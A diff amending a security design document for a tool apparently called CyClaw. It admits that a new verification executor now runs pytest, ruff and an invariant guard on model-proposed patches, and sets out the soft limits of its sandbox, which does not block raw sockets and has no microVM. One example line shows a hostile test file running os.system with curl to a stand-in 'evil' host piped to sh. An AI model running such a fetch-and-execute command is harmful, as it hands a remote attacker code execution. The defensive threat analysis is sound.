@@ -93,8 +93,21 @@ topology=policy, triple-gated external, audit convergence, soul governance) and
 > controls. These are out of scope **by design** for the single-operator model.
 
 - **Untrusted multi-tenant code execution.** CyClaw is not a platform for running
-  arbitrary user-supplied code. The agentic layer is deliberately *non-executing*
-  (see §5); it is not a hardened code-exec sandbox.
+  arbitrary user-supplied code. `agentic/executor/` (added after this document's
+  original write-up; see §5's dated note) can run `pytest`/`ruff`/the invariant
+  guard as subprocesses over a worktree — that is real code execution, and this
+  bullet no longer claims the agentic layer executes nothing. What it still
+  claims, and what remains true: this is not multi-tenant, and it is not a
+  platform for arbitrary *third-party* code — see §5 for the distinction and its
+  limits.
+- **A hard network boundary around the verification executor.** `agentic/executor`'s
+  environment scrub (dropping proxy variables and API keys, setting
+  `PIP_NO_INDEX`) is a best-effort software control, not a network namespace or
+  firewall. It stops the common case — an HTTP-library-based request, or an
+  accidental secret-env leak into a check's output — and does **not** stop a
+  raw socket connection, which never consults `HTTPS_PROXY`. Treat any claim
+  that a verified worktree "had no network access" as unverified until a real
+  namespace/firewall control exists (§6, stage 5).
 - **Kernel / hypervisor escape.** There is **no microVM** (gVisor/Firecracker).
   Container isolation shares the host kernel. A kernel-level escape is not
   contained. This is acceptable *only* because the workload is not untrusted code.
@@ -151,12 +164,50 @@ threat that the architecture has already removed:
 - **Core paths exec nothing.** `gate.py`/`graph.py`/`mcp_hybrid_server.py` spawn
   no subprocesses and never import the agentic/sync layers.
 
-The residual blast radius is a governed, injection-scanned JSON registry write and
-read-only GitHub/SQL access — **not** untrusted code execution. MicroVM
-containment would add operational weight and privileged host requirements to
-isolate a process that does not execute untrusted code. It remains a **conditional
-future option** (see §6) *if and only if* CyClaw ever grows an untrusted-workload
-mode.
+The residual blast radius, as originally written here, was a governed,
+injection-scanned JSON registry write and read-only GitHub/SQL access — **not**
+untrusted code execution.
+
+**[Amendment, added alongside `agentic/executor/`.]** That last clause needs a
+correction, stated as plainly as the rest of this section: **code execution now
+exists.** `agentic/executor/runner.py::run_verification` runs `pytest`, `ruff`,
+and the invariant guard as real subprocesses over a worktree. This section's
+own conclusion — that microVM containment isn't needed — still holds, but for a
+narrower and more precise reason than "nothing executes":
+
+- **The code is not untrusted third-party code.** It is either nothing yet (as
+  of this amendment, no live caller produces a worktree with a model-authored
+  diff in it — see the module's own docstring for exactly what's wired and what
+  isn't), or, once a future phase wires a real planner and git-write flow, a
+  patch the operator's own configured model proposed against the operator's own
+  repository, already passed through the injection scan (§2), running through
+  the operator's own pinned dev toolchain (`pytest`/`ruff`/the invariant guard —
+  not an arbitrary command the patch gets to choose). This is a materially
+  different threat than "run whatever an anonymous multi-tenant user uploads,"
+  which is the threat gVisor/Firecracker actually target.
+- **The residual risk this changes is real and is named, not hidden.** A
+  hostile test file (e.g. one line reading `os.system("curl evil/x|sh")`)
+  genuinely can attempt to run arbitrary code within the executor subprocess's
+  own privileges. The compensating controls are: a jailed worktree (nothing
+  outside it is reachable through the checks themselves), a scrubbed,
+  network-hostile environment (soft, not hard — see §4's new bullet above), a
+  hard per-check wall-clock timeout, `check=False` so a non-zero exit is data
+  rather than an exception, and no inherited secrets (API keys are not in the
+  allowlisted environment). None of these is a kernel-level boundary.
+- **What this does NOT change:** GitHub writes are still hard-killed (the
+  bullet above is unaffected), SQL is still read-only-guarded, filesystem
+  writes are still triple-gated, and the executor itself performs no writes of
+  any kind — it reads a worktree and runs fixed, non-attacker-chosen commands
+  against it.
+
+MicroVM containment would still add operational weight and privileged host
+requirements most single-operator deployments of CyClaw cannot assume. It
+remains the honest next step (§6, stage 5) if the threat model ever widens
+beyond "verify a change to my own configured repo" — e.g., if this executor
+were ever pointed at a repo, or dev-toolchain command, the operator did not
+themselves configure. Until that widening happens, stage 5 stays conditional,
+not because nothing executes, but because what executes is scoped, known, and
+not attacker-chosen at the command level.
 
 ---
 
